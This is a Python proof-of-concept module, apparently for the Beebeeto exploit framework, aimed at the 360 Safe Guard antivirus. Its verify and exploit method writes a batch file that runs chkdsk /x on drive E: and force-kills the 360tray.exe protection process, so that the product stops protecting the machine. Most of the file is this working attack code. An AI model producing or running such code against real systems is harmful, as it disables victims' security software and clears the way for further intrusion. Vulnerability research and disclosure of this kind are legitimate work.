#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0152',
            'name': '360安全卫士安装非默认路径 chkdsk taskkill主进程 POC',
            'author': '雷蜂',
            'create_date': '2014-11-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'local',
            'port': [0],
            'layer4_protocol': [],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '360',
            'vul_version': ['*'],
            'type': 'Other',
            'tag': ['本地提权', '杀掉360主进程', 'chkdsk taskkill', '360漏洞'],
            'desc': '''
                    Wooyun Author zhuixing:
                    测试使用Windows XP SP3，VMware Workstation 10.0.3。
                    经测试，如果360安全卫士（其实不止360一家）安装在非系统盘(360自身默认安装在非系统盘），
                    然后对其所在盘符进行chkdsk /x 操作，其主防进程360tray.exe会自动强行退出，从而完全失去保护能力。

                    ''',
            'references': ['http://wooyun.org/bugs/wooyun-2014-078641',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        payload = '''
@echo off

chkdsk /x e:

taskkill /F /IM 360tray.exe /T
'''
        # write
        test_bat = open('./360-taskkill.bat', 'w')
        test_bat.write(payload)
        test_bat.close()
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok, file: ./360-taskkill.bat'
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())